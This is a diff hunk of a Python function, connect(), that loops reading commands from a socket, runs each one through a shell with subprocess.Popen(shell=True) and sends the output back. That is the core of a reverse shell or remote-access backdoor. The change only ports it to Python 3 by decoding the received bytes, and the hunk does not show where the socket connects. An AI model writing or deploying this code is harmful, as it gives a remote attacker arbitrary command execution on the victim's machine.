@@ -8,11 +8,11 @@ def connect():
     while True:
         command = s.recv(1024)
 
-        if 'terminate' in command:
+        if 'terminate' in command.decode('utf-8'):
             s.close()
             break
         else:
-            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            CMD = subprocess.Popen(command.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             s.send(CMD.stdout.read())
             s.send(CMD.stderr.read())
 
